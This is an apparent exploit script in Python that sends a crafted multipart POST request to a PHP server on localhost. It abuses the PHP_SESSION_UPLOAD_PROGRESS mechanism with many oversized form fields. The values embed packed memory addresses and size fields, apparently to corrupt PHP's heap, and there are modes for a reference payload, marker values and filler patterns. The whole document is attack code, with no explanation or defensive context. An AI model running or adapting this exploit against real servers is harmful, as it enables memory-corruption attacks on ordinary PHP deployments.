#!/usr/bin/env python3
import socket, struct, sys
N1=int(sys.argv[1]); N2=int(sys.argv[2]); L1=int(sys.argv[3]); L2=int(sys.argv[4]); MODE=sys.argv[5] if len(sys.argv)>5 else 'ref'
BND=b'B'*10; HOST='127.0.0.1'; PORT=8088; SID=b'attacksessionid0001'
if MODE=='ref':
    val2=b'X'*16 + struct.pack('<IIQ',1,10,0x00007ffff5e02400) + struct.pack('<Q',0x307) + b'Z'*(L2-40)
elif MODE=='mark':
    val2=b'X'*16 + struct.pack('<Q',0x4141414141414141) + struct.pack('<Q',0x4242424242424242) + b'Z'*(L2-32)
else:
    val2=(b'\x41'*8+b'\x42'*8+b'\x43'*8+b'\x44'*8)*8
val2=val2[:L2]
val1=b'Q'*L1
parts=[{'name':'PHPSESSID','data':SID},{'name':'PHP_SESSION_UPLOAD_PROGRESS','data':b'pwn'}]
for i in range(N1):
    parts.append({'name':('a%030d'%i)[:31],'data':val1})
for i in range(N2):
    parts.append({'name':('f%02d'%i),'data':val2})
o=bytearray()
for p in parts:
    o+=b'--'+BND+b'\r\nContent-Disposition: form-data; name="'+p['name'].encode()+b'"\r\n\r\n'+p['data']+b'\r\n'
o+=b'--'+BND+b'--\r\n'; body=bytes(o)
h=(f'POST /index.php HTTP/1.1\r\nHost: {HOST}:{PORT}\r\nContent-Type: multipart/form-data; boundary={BND.decode()}\r\nContent-Length: {len(body)}\r\nConnection: close\r\n\r\n').encode()
s=socket.create_connection((HOST,PORT),timeout=20); s.settimeout(20)
try: s.sendall(h+body)
except OSError: pass
try:
    while s.recv(65536): pass
except OSError: pass
s.close()
